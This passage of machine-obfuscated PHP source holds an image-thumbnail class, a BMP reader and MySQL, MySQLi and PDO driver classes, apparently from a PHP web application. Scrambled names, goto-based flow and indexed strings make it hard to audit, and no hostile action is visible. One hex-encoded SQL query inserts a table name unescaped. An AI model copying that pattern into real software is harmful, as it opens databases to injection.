1; } if ($eϪ؄[$E[513]] != 0) { $EǊ = $EŠ == 1 || $EŠ == 4 || $EŠ == 8 ? ($fʃ ? $fʃ : pow(2, $EŠ)) << 2 : 0; $Aߨͩ = $A劅 ? $A劅 : ($b̏ * $EŠ + 31 >> 3 & ~3) * abs($Fǔ); $E = $eϪ؄[$E[513]] - $Aߨͩ - $EǊ - 14; if ($b򊠤 < $E && 40 <= $b򊠤 && $b򊠤 <= 124) { $b򊠤 = $E; } } if ($b򊠤 - 40 > 0) { $bʚ = fread($AҴ, $b򊠤 - 40); if ($bʚ === !1) { return !1; } extract(unpack($E[1749] . $E[1750] . $E[1751] . $E[1752], $bʚ . str_repeat($E[1753], 120))); } else { $D = $Fڴ = $Cɦ = $Eʊ = 0; } goto eɖ; BƆŧ: $bʚ = fread($AҴ, 36); if ($bʚ === !1) { return !1; } extract(unpack($E[1740] . $E[1741] . $E[1738] . $E[1742] . $E[1743] . $E[1744] . $E[1745] . $E[1746] . $E[1747] . $E[1748], $bʚ)); goto BƩ; eɖ: if (($EŠ == 16 || $EŠ == 24 || $EŠ == 32) && $eۣ == 0 && $Fڴ == 0 && $Cɦ == 0 && $Eʊ == 0) { switch ($EŠ) { case 16: $Fڴ = 31744; $Cɦ = 992; $Eʊ = 31; break; case 24: case 32: $Fڴ = 16711680; $Cɦ = 65280; $Eʊ = 255; break; } } goto cơ纫; cơ纫: } } goto E紡ߗ; E紡ߗ: if ($b̏ == 0 || $Fǔ == 0 || $Aɺ != 1 || ($D & $Fڴ) != 0 || ($D & $Cɦ) != 0 || ($D & $Eʊ) != 0 || ($Fڴ & $Cɦ) != 0 || ($Fڴ & $Eʊ) != 0 || ($Cɦ & $Eʊ) != 0) { return !1; } if ($eۣ == 4 || $eۣ == 5) { $bʚ = stream_get_contents($AҴ, $A劅); if ($bʚ === !1) { return !1; } return imagecreatefromstring($bʚ); } $F = $b̏ * $EŠ + 31 >> 3 & ~3; goto D֕; Fݎ: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($Cǋ, $F) { goto B͊; B͊: $this->srcFile = $Cǋ; $this->echoType = $F; $this->im = self::image($Cǋ); goto d; d: if (!$this->im) { return !1; } $C޾ = $_SERVER[놫Ӱ][33]; $this->imgData = GetImageSize($Cǋ, $C޾); goto Fґݾ; Fґݾ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto d腿ᵐ; d腿ᵐ: } public static function image($B܆) { $bΙ =& $_SERVER[놫Ӱ]; $DĨӏ = $bΙ[33]; $A͆ = GetImageSize($B܆, $DĨӏ); $BĲؒ = !1; switch ($A͆[2]) { case IMAGETYPE_GIF: if (!function_exists($bΙ[1760])) { break; } $BĲؒ = imagecreatefromgif($B܆); break; case IMAGETYPE_JPEG: if (!function_exists($bΙ[1761])) { break; } $BĲؒ = imagecreatefromjpeg($B܆); break; case IMAGETYPE_PNG: if (!function_exists($bΙ[1762])) { break; } $BĲؒ = @imagecreatefrompng($B܆); imagesavealpha($BĲؒ, !0); break; case IMAGETYPE_XBM: $BĲؒ = imagecreatefromxbm($B܆); break; case IMAGETYPE_WBMP: $BĲؒ = imagecreatefromwbmp($B܆); break; case IMAGETYPE_BMP: $BĲؒ = imagecreatefrombmp($B܆); break; default: break; } return $BĲؒ; } public static function imageSize($A܈) { $C׈ׯ =& $_SERVER[놫Ӱ]; $dԋ = GetImageSize($A܈); if (!$dԋ) { return !1; } return array($C׈ׯ[1763] => $dԋ[0], $C׈ׯ[1764] => $dԋ[1]); } function distortion($e, $c׌, $a䦺ږ) { $aϊ = $this->creatImage($this->im, $c׌, $a䦺ږ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($aϊ, $e); } function prorate($cԂ, $A, $D͎) { $e = $A / $D͎; $Eɐ߯ = $this->srcW / $this->srcH; if ($e <= $Eɐ߯) { $b׻ = $A; $A޻ = $b׻ * ($this->srcH / $this->srcW); } else { $A޻ = $D͎; $b׻ = $A޻ * ($this->srcW / $this->srcH); } if ($this->srcW > $A || $this->srcH > $D͎) { $F΋ = $this->creatImage($this->im, $b׻, $A޻, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($F΋, $cԂ); } else { $F΋ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($F΋, $cԂ); } } function cut($d, $DԄ, $A΋) { goto Bᄔ; aÒ: return $this->echoImage($D犙, $d); goto Cՙ; FӴ: $E򇃜 = $this->creatImage($this->im, $c܈, $bۍ, 0, 0, 0, 0, $this->srcW, $this->srcH); $D犙 = $this->creatImage($E򇃜, $DԄ, $A΋, 0, 0, ($c܈ - $DԄ) / 2, ($bۍ - $A΋) / 2, $DԄ, $A΋); imageDestroy($E򇃜); goto aÒ; Bᄔ: $a = $DԄ / $A΋; $B₆ = $this->srcW / $this->srcH; if ($a <= $B₆) { $bۍ = $A΋; $c܈ = $bۍ * ($this->srcW / $this->srcH); } else { $c܈ = $DԄ; $bۍ = $c܈ * ($this->srcH / $this->srcW); } goto FӴ; Cՙ: } function backFill($e, $b߳ٷ, $C̄, $fЏ = false, $A䥏 = 255, $c䌞 = 255, $F = 255) { goto C; C: $Eհ = $b߳ٷ / $C̄; $e𑽇 = $this->srcW / $this->srcH; if ($Eհ <= $e𑽇) { $E = $b߳ٷ; $fׇ = $E * ($this->srcH / $this->srcW); } else { $fׇ = $C̄; $E = $fׇ * ($this->srcW / $this->srcH); } goto ađԚ; ađԚ: if (function_exists($_SERVER[놫Ӱ][1765])) { @($Aܤ꽰 = imageCreateTrueColor($b߳ٷ, $C̄)); if (!$Aܤ꽰) { $Aܤ꽰 = imageCreate($b߳ٷ, $C̄); } } else { $Aܤ꽰 = imageCreate($b߳ٷ, $C̄); } $a = ($C̄ - $fׇ) / 2; $Cķ = imagecolorallocate($Aܤ꽰, $A䥏, $c䌞, $F); goto fÌʂ; fÌʂ: if ($fЏ) { $Cķ = imageColorTransparent($Aܤ꽰, $Cķ); $a = $C̄ - $fׇ; } imageFilledRectangle($Aܤ꽰, 0, 0, $b߳ٷ, $C̄, $Cķ); if ($this->srcW > $b߳ٷ || $this->srcH > $C̄) { $fՊ = $this->creatImage($this->im, $E, $fׇ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($E < $b߳ٷ) { imageCopy($Aܤ꽰, $fՊ, ($b߳ٷ - $E) / 2, 0, 0, 0, $E, $fׇ); } else { if ($fׇ < $C̄) { imageCopy($Aܤ꽰, $fՊ, 0, $a, 0, 0, $E, $fׇ); } else { imageCopy($Aܤ꽰, $fՊ, 0, 0, 0, 0, $E, $fׇ); } } } else { imageCopyMerge($Aܤ꽰, $this->im, ($b߳ٷ - $E) / 2, $a, 0, 0, $E, $fׇ, 100); } goto Aއ; Aއ: return $this->echoImage($Aܤ꽰, $e); goto A׋̡; A׋̡: } function creatImage($c, $f, $Eڶ, $fɆ◫, $c덩, $Aҥڑ, $c܎Ë, $aͪ, $a䂸Ҩ) { if (function_exists($_SERVER[놫Ӱ][1765])) { @($Cꏖĩ = ImageCreateTrueColor($f, $Eڶ)); @imagealphablending($Cꏖĩ, !1); @imagesavealpha($Cꏖĩ, !0); if ($Cꏖĩ) { imageCopyResampled($Cꏖĩ, $c, $fɆ◫, $c덩, $Aҥڑ, $c܎Ë, $f, $Eڶ, $aͪ, $a䂸Ҩ); } else { $Cꏖĩ = ImageCreate($f, $Eڶ); imageCopyResized($Cꏖĩ, $c, $fɆ◫, $c덩, $Aҥڑ, $c܎Ë, $f, $Eڶ, $aͪ, $a䂸Ҩ); } } else { $Cꏖĩ = ImageCreate($f, $Eڶ); imageCopyResized($Cꏖĩ, $c, $fɆ◫, $c덩, $Aҥڑ, $c܎Ë, $f, $Eڶ, $aͪ, $a䂸Ҩ); } return $Cꏖĩ; } public function imgRotate($cڲ탱, $c앭) { goto BƯ; BƯ: if (!$this->im || $c앭 % 360 === 0 || !function_exists($_SERVER[놫Ӱ][1766])) { return !1; } $cł = imageRotate($this->im, 360 - $c앭, 0); $a⨬є = !1; goto Eզ; dƩ: return $a⨬є; goto A׹; Eզ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $a⨬є = imagegif($cł, $cڲ탱); break; case IMAGETYPE_JPEG: $a⨬є = imagejpeg($cł, $cڲ탱, 100); break; case IMAGETYPE_PNG: $a⨬є = imagePNG($cł, $cڲ탱); break; default: break; } imageDestroy($cł); imageDestroy($this->im); goto dƩ; A׹: } function echoImage($E, $CĆ) { goto Aƻ; c٣: $BǍ = !1; switch ($this->echoType) { case $Bɣ[1767]: $BǍ = imagePNG($E); break; case $Bɣ[164]: $BǍ = imagePNG($E, $CĆ); break; } imageDestroy($E); goto Dَ; Aƻ: $Bɣ =& $_SERVER[놫Ӱ]; if (!$E) { return !1; } ob_get_clean(); goto c٣; Dَ: imageDestroy($this->im); return $BǍ; goto a忆; a忆: } } if (!function_exists($_SERVER[놫Ӱ][1768])) { define($_SERVER[놫Ӱ][1769], 0); define($_SERVER[놫Ӱ][1770], 1); define($_SERVER[놫Ӱ][1771], 2); function imageflip($B, $D웊) { switch ($D웊) { case IMG_FLIP_HORIZONTAL: $eنޖ = imagesx($B) - 1; $Dݲ = $eنޖ / 2; $DɋՃ = imagesy($B); $b޵ȍ = imageistruecolor($B) ? imagecreatetruecolor(1, $DɋՃ) : imagecreate(1, $DɋՃ); for ($D = 0; $D < $Dݲ; ++$D) { imagecopy($b޵ȍ, $B, 0, 0, $D, 0, 1, $DɋՃ); imagecopy($B, $B, $D, 0, $eنޖ - $D, 0, 1, $DɋՃ); imagecopy($B, $b޵ȍ, $eنޖ - $D, 0, 0, 0, 1, $DɋՃ); } break; case IMG_FLIP_VERTICAL: $F = imagesx($B); $Fڸ = imagesy($B) - 1; $aثʞ = $Fڸ / 2; $b޵ȍ = imageistruecolor($B) ? imagecreatetruecolor($F, 1) : imagecreate($F, 1); for ($F = 0; $F < $aثʞ; ++$F) { imagecopy($b޵ȍ, $B, 0, 0, 0, $F, $F, 1); imagecopy($B, $B, 0, $F, 0, $Fڸ - $F, $F, 1); imagecopy($B, $b޵ȍ, 0, $Fڸ - $F, 0, 0, $F, 1); } break; case IMG_FLIP_BOTH: $F = imagesx($B); $DɋՃ = imagesy($B); $b޵ȍ = imagerotate($B, 180, 0); imagecopy($B, $b޵ȍ, 0, 0, 0, 0, $F, $DɋՃ); break; default: return; } imagedestroy($b޵ȍ); } } goto A; d: class DbMysql extends Db { public function __construct($b֑ = '') { $C݈ =& $_SERVER[놫Ӱ]; if (!extension_loaded($C݈[701])) { think_exception(think_lang($C݈[10]) . $C݈[790]); } if (!empty($b֑)) { $this->config = $b֑; if (empty($this->config[$C݈[13]])) { $this->config[$C݈[13]] = $C݈[33]; } } } public function connect($A = '', $eݐ = 0, $fӣ = false) { $eړ =& $_SERVER[놫Ӱ]; if (!isset($this->linkID[$eݐ])) { goto F®; c: if ($D) { $this->linkID[$eݐ] = mysql_pconnect($a͍č, $A[$eړ[793]], $A[$eړ[794]], 131072); } else { $this->linkID[$eݐ] = mysql_connect($a͍č, $A[$eړ[793]], $A[$eړ[794]], !0, 131072); } if (!$this->linkID[$eݐ] || !empty($A[$eړ[17]]) && !mysql_select_db($A[$eړ[17]], $this->linkID[$eݐ])) { think_exception(mysql_error()); } $e = mysql_get_server_info($this->linkID[$eݐ]); goto fߟʭ; aʈݺ: if (1 != think_config($eړ[18])) { unset($this->config); } goto a; F®: if (empty($A)) { $A = $this->config; } $a͍č = $A[$eړ[791]] . ($A[$eړ[792]] ? "\x3a{$A[$eړ[792]]}" : $eړ[33]); $D = !empty($A[$eړ[13]][$eړ[14]]) ? $A[$eړ[13]][$eړ[14]] : $this->pconnect; goto c; fߟʭ: mysql_query($eړ[795] . think_config($eړ[796]) . $eړ[55], $this->linkID[$eݐ]); if ($e > $eړ[797]) { mysql_query($eړ[798], $this->linkID[$eݐ]); } $this->connected = !0; goto aʈݺ; a: } return $this->linkID[$eݐ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($d) { goto D; a뱬: if (!$this->_linkID) { return !1; } $this->queryStr = $d; if ($this->queryID) { $this->free(); } goto aʷ; B̯ӈ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto F߻٧; D: $E =& $_SERVER[놫Ӱ]; if (0 === stripos($d, $E[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto a뱬; aʷ: think_action_status($E[19], 1); think_status($E[20]); $this->queryID = mysql_query($d, $this->_linkID); goto B̯ӈ; F߻٧: } public function execute($C) { goto Bь; d驺: think_status($Bهߪ[20]); $fҋ = mysql_query($C, $this->_linkID); $this->debug(); goto C; b: $this->queryStr = $C; if ($this->queryID) { $this->free(); } think_action_status($Bهߪ[21], 1); goto d驺; C: if (!1 === $fҋ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto a; Bь: $Bهߪ =& $_SERVER[놫Ӱ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b; a: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[놫Ӱ][799], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AБ = mysql_query($_SERVER[놫Ӱ][800], $this->_linkID); $this->transTimes = 0; if (!$AБ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D兟񼤯 = mysql_query($_SERVER[놫Ӱ][801], $this->_linkID); $this->transTimes = 0; if (!$D兟񼤯) { $this->error(); return !1; } } return !0; } private function getAll() { $EԽ = array(); if ($this->numRows > 0) { while ($cÔ = mysql_fetch_assoc($this->queryID)) { $EԽ[] = $cÔ; } mysql_data_seek($this->queryID, 0); } return $EԽ; } public function getFields($Eʟ) { $A戉 =& $_SERVER[놫Ӱ]; $Aå傩 = $this->query($A戉[802] . $this->parseKey($Eʟ)); $A㰢 = array(); if ($Aå傩) { foreach ($Aå傩 as $f˶󌹎 => $Bز) { $A㰢[$Bز[$A戉[27]]] = array($A戉[28] => $Bز[$A戉[27]], $A戉[29] => $Bز[$A戉[30]], $A戉[31] => (bool) (strtoupper($Bز[$A戉[32]]) === $A戉[803]), $A戉[34] => $Bز[$A戉[35]], $A戉[36] => strtolower($Bز[$A戉[37]]) == $A戉[38], $A戉[39] => strtolower($Bز[$A戉[40]]) == $A戉[41]); } } return $A㰢; } public function getTables($eȨ = '') { $B⦛ =& $_SERVER[놫Ӱ]; if (!empty($eȨ)) { $eﴪק = $B⦛[804] . $eȨ; } else { $eﴪק = $B⦛[805]; } $bԢ = $this->query($eﴪק); $Dԉ = array(); foreach ($bԢ as $dؿ => $E) { $Dԉ[$dؿ] = current($E); } return $Dԉ; } public function replace($Bޘ, $F = array()) { $eܦ =& $_SERVER[놫Ӱ]; foreach ($Bޘ as $A => $Eн) { $cư׼ = $this->parseValue($Eн); if (is_scalar($cư׼)) { $F[] = $cư׼; $cʍ[] = $this->parseKey($A); } } $b = $eܦ[806] . $this->parseTable($F[$eܦ[264]]) . $eܦ[807] . implode($eܦ[47], $cʍ) . $eܦ[808] . implode($eܦ[47], $F) . $eܦ[809]; return $this->execute($b); } public function insertAll($Aٺ, $eĭ = array(), $c̦ = false) { goto Cȷ; Aǖǚ: $eɥ = array(); foreach ($Aٺ as $Bٲ) { $cꋌ = array(); foreach ($Bٲ as $fʊ => $b) { $b = $this->parseValue($b); if (is_scalar($b)) { $cꋌ[] = $b; } } $eɥ[] = $eݮ[245] . implode($eݮ[47], $cꋌ) . $eݮ[809]; } array_walk($b͋Ȱ, array($this, $eݮ[810])); goto C; Cȷ: $eݮ =& $_SERVER[놫Ӱ]; if (!is_array($Aٺ[0])) { return !1; } $b͋Ȱ = array_keys($Aٺ[0]); goto Aǖǚ; C: $aȫ = ($c̦ ? $eݮ[811] : $eݮ[812]) . $eݮ[813] . $this->parseTable($eĭ[$eݮ[264]]) . $eݮ[807] . implode($eݮ[47], $b͋Ȱ) . $eݮ[814] . implode($eݮ[47], $eɥ); return $this->execute($aȫ); goto a; a: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $f =& $_SERVER[놫Ӱ]; $this->error = mysql_errno() . $f[4] . mysql_error($this->_linkID); if ($f[33] != $this->queryStr) { $this->error .= LNG($f[45]) . $this->queryStr; } think_trace($this->error, $f[33], $f[46]); return $this->error; } public function escapeString($b阌ϡ) { if ($this->_linkID) { return mysql_real_escape_string($b阌ϡ, $this->_linkID); } else { return mysql_escape_string($b阌ϡ); } } public function parseKey(&$F, $cǵ = true) { $d硒 =& $_SERVER[놫Ӱ]; if ($cǵ) { $F = $this->parseKeyCheck($F); } if ($F != $d硒[173] && !preg_match($d硒[815], $F)) { $F = $d硒[816] . trim($F, $d硒[816]) . $d硒[816]; } return $F; } } class DbMysqli extends Db { public function __construct($A = '') { $fɫ =& $_SERVER[놫Ӱ]; if (!extension_loaded($fɫ[817])) { think_exception(think_lang($fɫ[10]) . $fɫ[818]); } if (!empty($A)) { $this->config = $A; if (empty($this->config[$fɫ[13]])) { $this->config[$fɫ[13]] = $fɫ[33]; } } } public function connect($aΛ = '', $E統 = 0) { $a׮У =& $_SERVER[놫Ӱ]; if (!isset($this->linkID[$E統])) { goto Fᩴ; CԍҌ: $F凘 = $this->linkID[$E統]->server_version; $this->linkID[$E統]->query($a׮У[795] . think_config($a׮У[796]) . $a׮У[55]); if ($F凘 > $a׮У[797]) { $this->linkID[$E統]->query($a׮У[798]); } goto Eݏ; Fᩴ: if (empty($aΛ)) { $aΛ = $this->config; } $this->linkID[$E統] = new mysqli($aΛ[$a׮У[791]], $aΛ[$a׮У[793]], $aΛ[$a׮У[794]], $aΛ[$a׮У[17]], $aΛ[$a׮У[792]] ? intval($aΛ[$a׮У[792]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto CԍҌ; Eݏ: $this->connected = !0; if (1 != think_config($a׮У[18])) { unset($this->config); } goto a؃; a؃: } return $this->linkID[$E統]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($bđɧ) { goto B潤; CҘ: $this->queryStr = $bđɧ; if ($this->queryID) { $this->free(); } think_action_status($c΄׈[19], 1); goto e; B潤: $c΄׈ =& $_SERVER[놫Ӱ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CҘ; e: think_status($c΄׈[20]); $this->queryID = $this->_linkID->query($bđɧ); if ($this->_linkID->more_results()) { while (($d܏ = $this->_linkID->next_result()) != NULL) { $d܏->free_result(); } } goto AϜ; AϜ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto D蕠; D蕠: } public function execute($A) { goto e񦪡; bٯž: $this->queryStr = $A; if ($this->queryID) { $this->free(); } think_action_status($D懃[21], 1); goto c鄢; e񦪡: $D懃 =& $_SERVER[놫Ӱ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bٯž; AʳՈ: if (!1 === $AΡηٌ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto eᶯ; c鄢: think_status($D懃[20]); $AΡηٌ = $this->_linkID->query($A); $this->debug(); goto AʳՈ; eᶯ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$f) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $C䥧 = $this->_linkID->rollback(); $this->transTimes = 0; if (!$C䥧) { $this->error(); return !1; } } return !0; } private function getAll() { $C = array(); if ($this->numRows > 0) { for ($Fѣ = 0; $Fѣ < $this->numRows; $Fѣ++) { $C[$Fѣ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $C; } public function getFields($Bܡ) { $Bǿ =& $_SERVER[놫Ӱ]; $fĜ = $this->query($Bǿ[802] . $this->parseKey($Bܡ)); $E޳ = array(); if ($fĜ) { foreach ($fĜ as $eσ => $eɺ܅) { $E޳[$eɺ܅[$Bǿ[27]]] = array($Bǿ[28] => $eɺ܅[$Bǿ[27]], $Bǿ[29] => $eɺ܅[$Bǿ[30]], $Bǿ[31] => (bool) ($eɺ܅[$Bǿ[32]] === $Bǿ[33]), $Bǿ[34] => $eɺ܅[$Bǿ[35]], $Bǿ[36] => strtolower($eɺ܅[$Bǿ[37]]) == $Bǿ[38], $Bǿ[39] => strtolower($eɺ܅[$Bǿ[40]]) == $Bǿ[41]); } } return $E޳; } public function getTables($cܫ = '') { $B =& $_SERVER[놫Ӱ]; $fז = !empty($cܫ) ? $B[804] . $cܫ : $B[805]; $A = $this->query($fז); $E = array(); if ($A) { foreach ($A as $dݻ => $B) { $E[$dݻ] = current($B); } } return $E; } public function replace($e, $E = array()) { $fת֖Т =& $_SERVER[놫Ӱ]; foreach ($e as $fˆĨ => $F) { $aㄛ = $this->parseValue($F); if (is_scalar($aㄛ)) { $E졮[] = $aㄛ; $cԧ[] = $this->parseKey($fˆĨ); } } $aЄȲ = $fת֖Т[806] . $this->parseTable($E[$fת֖Т[264]]) . $fת֖Т[807] . implode($fת֖Т[47], $cԧ) . $fת֖Т[808] . implode($fת֖Т[47], $E졮) . $fת֖Т[809]; return $this->execute($aЄȲ); } public function insertAll($EƳ, $Fގ = array(), $F = false) { goto D; Aܟ: $c = ($F ? $c׍[811] : $c׍[812]) . $c׍[813] . $this->parseTable($Fގ[$c׍[264]]) . $c׍[807] . implode($c׍[47], $b氙) . $c׍[814] . implode($c׍[47], $E랗); return $this->execute($c); goto e̙; Dĵʗ: $E랗 = array(); foreach ($EƳ as $e잇) { $F΍ = array(); foreach ($e잇 as $aҮؑ => $A굟ڨ) { $A굟ڨ = $this->parseValue($A굟ڨ); if (is_scalar($A굟ڨ)) { $F΍[] = $A굟ڨ; } } $E랗[] = $c׍[245] . implode($c׍[47], $F΍) . $c׍[809]; } array_walk($b氙, array($this, $c׍[810])); goto Aܟ; D: $c׍ =& $_SERVER[놫Ӱ]; if (!is_array($EƳ[0])) { return !1; } $b氙 = array_keys($EƳ[0]); goto Dĵʗ; e̙: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eʋ =& $_SERVER[놫Ӱ]; $this->error = $this->_linkID->errno . $eʋ[4] . $this->_linkID->error; if ($eʋ[33] != $this->queryStr) { $this->error .= LNG($eʋ[45]) . $this->queryStr; } think_trace($this->error, $eʋ[33], $eʋ[46]); return $this->error; } public function escapeString($bΟ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($bΟ); } else { return addslashes($bΟ); } } public function parseKey(&$Fе, $F = true) { $EԾ =& $_SERVER[놫Ӱ]; if ($F) { $Fе = $this->parseKeyCheck($Fе); } if ($Fе != $EԾ[173] && !preg_match($EԾ[815], $Fе)) { $Fе = $EԾ[816] . trim($Fе, $EԾ[816]) . $EԾ[816]; } return $Fе; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Cͳ = '') { $D붹 =& $_SERVER[놫Ӱ]; if (!class_exists($D붹[819])) { think_exception(think_lang($D붹[10]) . $D붹[820]); } if (!empty($Cͳ)) { $this->config = $Cͳ; if (empty($this->config[$D붹[13]])) { $this->config[$D붹[13]] = array(); } } } public function connect($aؖߠ = '', $B򡯬χ = 0) { $F =& $_SERVER[놫Ӱ]; if (!isset($this->linkID[$B򡯬χ])) { goto bʠ; B屏: $this->dbType = $this->_getDsnType($aؖߠ[$F[821]]); if (in_array($this->dbType, array($F[822], $F[823], $F[824], $F[825]))) { think_exception($F[826] . $this->dbType . $F[827] . $this->dbType . $F[828]); } if (!$this->linkID[$B򡯬χ]) { think_exception($F[829]); } goto eߣ; eߣ: $this->linkID[$B򡯬χ]->exec($F[830] . think_config($F[796])); $this->connected = !0; if (1 != think_config($F[18])) { unset($this->config); } goto fދ; bʠ: if (empty($aؖߠ)) { $aؖߠ = $this->config; } if ($this->pconnect) { $aؖߠ[$F[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$B򡯬χ] = new PDO($aؖߠ[$F[821]], $aؖߠ[$F[793]], $aؖߠ[$F[794]], $aؖߠ[$F[13]]); } catch (PDOException $b) { think_exception($b->getMessage()); } goto B屏; fދ: } return $this->linkID[$B򡯬χ]; } public function free() { $this->PDOStatement = null; } public function query($d͛, $fӅ = array()) { goto f; aƄק: think_action_status($dܪɧ[19], 1); think_status($dܪɧ[20]); $this->PDOStatement = $this->_linkID->prepare($d͛); goto EȪ; b䃖駰: if (!1 === $cʿ．) { $this->error(); return !1; } else { return $this->getAll(); } goto c; C砇: $this->queryStr = $d͛; if (!empty($fӅ)) { $this->queryStr .= $dܪɧ[831] . print_r($fӅ, !0) . $dܪɧ[832]; } if (!empty($this->PDOStatement)) { $this->free(); } goto aƄק; EȪ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $cʿ． = $this->PDOStatement->execute($fӅ); $this->debug(); goto b䃖駰; f: $dܪɧ =& $_SERVER[놫Ӱ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C砇; c: } public function execute($dז醲, $bƢʋ = array()) { goto Dײ; F頗: $this->queryStr = $dז醲; if (!empty($bƢʋ)) { $this->queryStr .= $C͐ɋ[831] . print_r($bƢʋ, !0) . $C͐ɋ[832]; } $bά = !1; goto C; C: if ($this->dbType == $C͐ɋ[825]) { if (preg_match($C͐ɋ[833], $this->queryStr, $D)) { $this->table = think_config($C͐ɋ[834]) . str_ireplace(think_config($C͐ɋ[835]), $C͐ɋ[358], $D[2]); $bά = (bool) $this->query($C͐ɋ[836] . strtoupper($this->table) . $C͐ɋ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($C͐ɋ[21], 1); goto bͫ¬; Dײ: $C͐ɋ =& $_SERVER[놫Ӱ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F頗; bͫ¬: think_status($C͐ɋ[20]); $this->PDOStatement = $this->_linkID->prepare($dז醲); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto d; d: $Bëө = $this->PDOStatement->execute($bƢʋ); $this->debug(); if (!1 === $Bëө) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($bά || preg_match($C͐ɋ[837], $dז醲)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto BǤ; BǤ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A = $this->_linkID->commit(); $this->transTimes = 0; if (!$A) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cǹу = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Cǹу) { $this->error(); return !1; } } return !0; } private function getAll() { $d򂗮κ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($d򂗮κ); return $d򂗮κ; } public function getFields($d) { goto B; D: return $EǘÅɵ; goto dȯ; B: $aĘ =& $_SERVER[놫Ӱ]; $this->initConnect(!0); if (think_config($aĘ[838])) { $a = str_replace($aĘ[839], $d, think_config($aĘ[838])); } else { switch ($this->dbType) { case $aĘ[822]: case $aĘ[840]: $a = "\x53\105\x4c\105\103\124\x20\x20\40\143\157\154\x75\x6d\x6e\x5f\x6e\141\155\145\40\x61\163\x20\47\116\141\155\x65\x27\x2c\x20\x20\x20\144\x61\x74\x61\137\164\x79\x70\145\40\141\163\x20\47\x54\x79\160\x65\x27\x2c\x20\40\x20\x63\x6f\x6c\165\155\156\x5f\144\145\x66\x61\165\x6c\164\x20\141\163\x20\47\x44\145\146\x61\x75\x6c\x74\x27\x2c\40\40\40\x69\x73\137\x6e\165\154\x6c\x61\x62\154\x65\40\141\x73\40\x27\116\165\x6c\154\47\xa\x9\11\x46\x52\x4f\x4d\11\x69\156\146\x6f\x72\x6d\141\x74\151\x6f\x6e\137\x73\143\150\x65\x6d\x61\56\164\141\x62\154\x65\x73\x20\101\x53\40\164\12\11\11\x4a\x4f\x49\116\11\151\x6e\146\157\x72\155\x61\x74\151\157\x6e\137\x73\x63\x68\x65\155\x61\56\x63\x6f\154\165\155\156\x73\40\x41\123\x20\143\xa\11\11\117\x4e\x20\x20\x74\x2e\x74\x61\142\x6c\145\137\143\x61\164\x61\x6c\157\x67\40\x3d\40\143\56\x74\141\142\x6c\145\137\x63\141\x74\x61\x6c\157\x67\12\x9\11\101\x4e\x44\40\164\x2e\x74\x61\x62\x6c\x65\137\x73\x63\x68\145\155\x61\40\x3d\40\143\x2e\164\x61\x62\154\x65\x5f\163\x63\150\x65\x6d\141\12\11\11\101\x4e\x44\40\x74\x2e\164\x61\x62\x6c\145\137\156\x61\x6d\x65\x20\75\40\x63\56\164\141\142\x6c\x65\137\x6e\x61\155\x65\xa\11\11\x57\110\105\122\105\40\40\40\x74\x2e\x74\141\142\154\145\137\156\141\x6d\145\x20\75\x20\x27{$d}\47"; break; case $aĘ[841]: $a = $aĘ[842] . $d . $aĘ[843]; break; case $aĘ[823]: case $aĘ[825]: $a = $aĘ[844] . $aĘ[845] . $aĘ[846] . strtoupper($d) . $aĘ[847] . strtoupper($d) . $aĘ[848]; break; case 